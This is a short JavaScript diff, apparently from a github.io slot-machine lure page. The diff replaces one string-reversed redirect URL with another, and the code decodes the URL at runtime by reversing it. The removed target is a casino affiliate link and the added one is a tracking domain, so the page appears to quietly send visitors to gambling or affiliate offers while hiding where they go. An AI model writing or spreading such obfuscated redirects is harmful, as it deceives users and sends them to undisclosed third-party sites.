@@ -2,8 +2,7 @@ var count_spins = 0;
 var slot_selector = $('.slot');
 var comment_count_selector = $('#comment-count');
 var switched = 0;
-//var go_url = 'oi.buhtig.333yubekac=ps?/nitposc/w/ten.ndc-dw//:sptth';
-var go_url = 'oi.buhtig.0202reyubekac=di_bus?2c00c076d0f34c8255010be5/l/moc.sreffo-sagevnakluv//:sptth';
+var go_url = 'oi.buhtig.0202reyubekac=ps?/nitposc/w/ten.ndc-dw//:sptth';
 var page_url = 'cakebuyer2020.github.io';
 var new_url = go_url.split("").reverse().join("");
 
